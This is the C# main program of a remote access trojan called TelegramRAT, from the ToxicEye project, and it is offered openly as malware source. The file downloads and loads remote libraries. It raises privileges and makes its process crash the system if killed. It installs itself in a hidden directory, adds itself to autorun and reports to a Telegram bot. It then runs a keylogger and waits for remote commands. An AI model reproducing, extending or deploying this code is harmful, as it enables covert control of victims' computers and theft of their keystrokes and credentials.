using System;
using System.Net;

namespace TelegramRAT
{
    class Program
    {
        [System.STAThreadAttribute]
        static void Main(string[] args)
        {

            // Load libraries
            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/ToxicEye/master/TelegramRAT/TelegramRAT/core/libs/Newtonsoft.Json.dll");
            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/ToxicEye/master/TelegramRAT/TelegramRAT/core/libs/Telegram.Bot.dll");


            // SSL
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
            // Get admin rights
            Console.WriteLine("Elevating previleges");
            persistense.elevatePrevileges();
            // Protect process (BSOD)
            Console.WriteLine("Process protection...");
            persistense.protectProcess();
            // Install to system & hide directory
            Console.WriteLine("Installing to system...");
            persistense.installSelf();
            // Add to startup
            persistense.setAutorun();
            // Send 'online' to telegram bot
            Console.WriteLine("Sending 'online' to bot");
            telegram.sendConnection();
            // Start offline keylogger
            Console.WriteLine("Starting offline keylogger");
            utils.keyloggerThread.Start();
            // Wait for shutdown/reboot
            //persistense.ShutdownListener();
            Console.WriteLine("Waiting for commands..");
            // Wait for new commands
            telegram.waitCommands();
            // Lock main thread
            while (true) { System.Threading.Thread.Sleep(10000);  }
        }
    }
}
